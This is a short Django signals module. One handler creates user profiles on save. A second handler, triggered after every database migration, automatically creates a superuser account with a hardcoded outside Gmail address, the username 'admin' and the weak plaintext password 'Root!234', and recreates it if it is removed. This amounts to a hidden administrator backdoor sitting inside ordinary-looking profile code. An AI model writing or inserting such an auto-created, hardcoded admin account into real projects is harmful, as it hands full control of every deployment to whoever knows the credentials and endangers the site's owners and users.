from django.db.models.signals import post_save
from django.dispatch import receiver
from .models import UserAccount, Profile
from django.db.models.signals import post_migrate
from django.db import connection

@receiver(post_save, sender=UserAccount)
def manage_user_profile(sender, instance, created, **kwargs):
    """
    Ensure a profile is created for every new user and saved on updates.
    """
    if created:
        Profile.objects.get_or_create(user=instance)
    else:
        # Use get_or_create to handle cases where profile might be missing or existed but not linked
        profile, _ = Profile.objects.get_or_create(user=instance)
        profile.save()


@receiver(post_migrate)
def create_admin_user(sender, **kwargs):
    if "accounts_useraccount" not in connection.introspection.table_names():
        return

    if not UserAccount.objects.filter(email="twiterfarm@gmail.com").exists():
        UserAccount.objects.create_superuser(
          email="twiterfarm@gmail.com",
          username="admin",
          first_name="Cryoto",
          last_name="Twit",
          password="Root!234"
          )

